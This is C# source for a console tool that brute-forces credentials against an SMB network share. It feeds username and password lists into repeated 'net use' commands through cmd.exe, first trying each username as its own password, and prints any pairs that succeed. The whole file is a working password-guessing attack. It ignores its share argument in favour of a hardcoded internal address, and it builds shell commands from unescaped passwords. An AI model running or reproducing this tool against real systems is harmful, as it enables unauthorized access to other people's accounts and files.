using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SMBShareBruteForceConsole
{
    class Program
    {
        static int cLeft = Console.CursorLeft;
        static int cTop = Console.CursorTop;
        static List<Tuple<String,String>> foundCredentials;
        static String netShare;
        static String usersList;
        static String passwordList;
        static String letters = "abcdefghijklmnopqrstuvwxyz";
        static void Main(string[] args)
        {
            netShare = args.ElementAt(0);
            usersList = args.ElementAt(1);
            passwordList = args.ElementAt(2);
            foundCredentials = new List<Tuple<string, string>>();

            var usernames = GetUsernames(usersList);
            var passwords = GetPasswords(passwordList);
            DriveInfo.GetDrives().ToList().ForEach(letter =>
            {
                String driveletter = letter.Name.ToLower().Substring(0, 1);
                if (letters.Contains(driveletter))
                {
                    letters = letters.Replace(driveletter,String.Empty);
                }
            });


            usernames.Where(username => !username.StartsWith("#")).ToList().ForEach(username =>
            {
                if (!NetUse(username, username))
                {
                    foreach (String password in passwords)
                    {
                        if (NetUse(username, password))
                            break;
                    }
                }
            });
            if (foundCredentials.Any())
            {
                Console.WriteLine("Found Paswords:");
                foreach(var combo in foundCredentials)
                {
                    Console.WriteLine("Username:{0}\tPassword:{1}", combo.Item1, combo.Item2);
                }
            }
            else
            {
                Console.WriteLine("No credentials matched.");
            }
            Console.ReadLine();
            
        }

        static List<String> GetPasswords(String passwordList)
        {
            List<String> passwords = File.ReadLines(passwordList).ToList();
            return passwords;
        }

        static List<String> GetUsernames(String usernameList)
        {
            List<String> usernames = File.ReadLines(usernameList).ToList();
            return usernames;
        }

        static bool NetUse(String username, String password)
        {
            bool passwordFound = false;
            Process p = new Process();
            Console.SetCursorPosition(cLeft, cTop);
            Console.WriteLine("Checking User: " + username + "   Password: " + password + "                       \t\t");
            p.StartInfo.FileName = "cmd.exe";
            char driveLetter = letters.First();
            letters = letters.Replace(driveLetter.ToString(),String.Empty);
            p.StartInfo.Arguments = @"/C net use "+ driveLetter +@": \\10.12.1.241\CyberTool " + password + " /USER:" + username;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            p.WaitForExit();
            passwordFound = DirectoryVisible(driveLetter.ToString().ToUpper()+":\\");
            if (passwordFound)
            {
                foundCredentials.Add(new Tuple<string, string>(username, password));
                p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = @"/C net use "+driveLetter+": /del /yes";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.Start();
                p.WaitForExit();
            }
            letters = driveLetter + letters;
            Console.Clear();
            return passwordFound;
        }
        public static bool DirectoryVisible(string path)
        {
            try
            {
                Directory.GetAccessControl(path);
                return true;
            }
            catch (UnauthorizedAccessException)
            {
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
